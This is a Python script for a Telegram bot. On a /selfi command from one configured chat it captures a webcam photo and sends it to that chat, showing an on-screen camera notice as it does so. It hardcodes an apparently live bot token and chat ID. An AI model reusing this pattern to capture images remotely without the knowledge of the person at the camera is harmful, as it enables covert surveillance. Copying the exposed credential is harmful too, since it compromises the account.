import cv2
import requests
import time
import logging
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
import threading
import os
import sys

# Настройка логирования (в файл, чтобы не было консоли)
log_file = 'app_log.txt'
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)  # Для отладки, но в EXE с --windowed не видно
    ]
)
logger = logging.getLogger(__name__)

# Настройки
BOT_TOKEN = '8223923145:AAHqXYysm8csPt8fZ4UvydaIKBy1FT-zCAE'  # Ваш токен
CHAT_ID = '7573577333'  # Ваш chat_id
POLLING_INTERVAL = 5  # Проверка каждые 5 секунд (для клиента)

# Глобальная переменная для сигнала команды /selfi
selfi_triggered = False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('Бот готов. Используйте /selfi для запроса фото.')

async def selfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global selfi_triggered
    if str(update.effective_chat.id) == CHAT_ID:
        await update.message.reply_text('Команда /selfi получена. Запрашиваю фото с камеры...')
        logger.info(f'Команда /selfi от {update.effective_user.id}')
        selfi_triggered = True  # Сигнал для клиента
    else:
        await update.message.reply_text('Ошибка: у вас нет доступа к этой команде.')

def run_bot():
    """Запускает Telegram-бота"""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("selfi", selfi))
    application.run_polling()

def make_photo():
    """Делает фото с веб-камеры с явным индикатором"""
    # Создаем скрытое окно для tkinter
    root = tk.Tk()
    root.withdraw()
    
    # Показываем всплывающее окно только при команде /selfi (не при запуске)
    messagebox.showinfo("Камера", "Камера активна! Делается фото.")
    
    logger.info('Активация камеры...')
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        logger.error('Камера недоступна')
        messagebox.showerror("Ошибка", "Камера недоступна!")
        root.destroy()
        return None
    
    ret, frame = cap.read()
    if ret:
        photo_path = f'selfi_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        cv2.imwrite(photo_path, frame)
        cap.release()
        logger.info(f'Фото сохранено: {photo_path}')
        root.destroy()
        return photo_path
    
    cap.release()
    root.destroy()
    logger.error('Не удалось сделать фото')
    return None

def send_photo(photo_path):
    """Отправляет фото в Telegram"""
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
    try:
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': CHAT_ID, 'caption': f'Селфи от {datetime.now()}'}
            response = requests.post(url, files=files, data=data, timeout=30)
        logger.info(f'Фото отправлено: {response.status_code}')
        os.remove(photo_path)
    except Exception as e:
        logger.error(f'Ошибка отправки: {e}')
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
        data = {'chat_id': CHAT_ID, 'text': 'Ошибка: не удалось отправить фото!'}
        requests.post(url, data=data)

def client_loop():
    """Клиентская часть: проверяет сигнал команды /selfi"""
    global selfi_triggered
    logger.info('Клиент запущен. Ожидание команды /selfi...')
    while True:
        try:
            if selfi_triggered:
                logger.info('Обработка команды /selfi...')
                photo_path = make_photo()
                if photo_path:
                    send_photo(photo_path)
                else:
                    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
                    data = {'chat_id': CHAT_ID, 'text': 'Ошибка: не удалось сделать фото!'}
                    requests.post(url, data=data)
                selfi_triggered = False  # Сбрасываем флаг
            time.sleep(POLLING_INTERVAL)
        except KeyboardInterrupt:
            logger.info('Клиент остановлен пользователем.')
            break
        except Exception as e:
            logger.error(f'Общая ошибка: {e}')
            time.sleep(POLLING_INTERVAL)

def main():
    """Запускает бота и клиент в отдельных потоках"""
    logger.info('Приложение запущено. Бот и клиент активны.')
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    # Запускаем клиентский цикл в основном потоке
    client_loop()

if __name__ == '__main__':
    main()